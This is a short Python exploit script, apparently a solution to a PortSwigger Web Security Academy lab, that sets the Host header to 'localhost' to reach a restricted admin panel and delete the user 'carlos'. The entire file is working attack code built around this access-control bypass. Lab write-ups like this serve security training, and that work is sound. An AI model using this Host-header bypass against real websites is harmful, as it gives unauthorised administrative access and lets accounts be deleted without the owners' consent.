import sys
import requests



def delete_user(url, session):
    session.get(url, timeout=10)
    cookies = {"session": session.cookies["session"], "_lab": session.cookies["_lab"]}
    response = session.get(f"{url}/admin/delete?username=carlos", headers={"Host": "localhost"}, cookies=cookies, timeout=10)
    return "User deleted successfully!" in response.text


def main():
    if len(sys.argv) != 2:
        print(f"(+) Usage: python3 {sys.argv[0]} <URL>")
        print(f"(+) Example: python3 {sys.argv[0]} https://0a54001c03544eff826c97940016002a.web-security-academy.net")
        sys.exit(1)

    try:
        url = sys.argv[1].rstrip("/")
        session = requests.Session()
        session.mount("https://", requests.adapters.HTTPAdapter(max_retries=requests.adapters.Retry(total=3, backoff_factor=0.1)))

        print("(+) Deleting the user \"carlos\"...")
        if delete_user(url, session):
            print("(+) User deleted successfully!")
        else:
            print("(-) Something went wrong.")


    except requests.exceptions.Timeout:
        print("(-) Request timed out.")

    except requests.exceptions.MissingSchema:
        print("(-) Please enter a valid URL.")

    except requests.exceptions.ConnectionError:
        print("(-) Unable to connect to the host. Check your URL and try again.")


if __name__ == "__main__":
    main()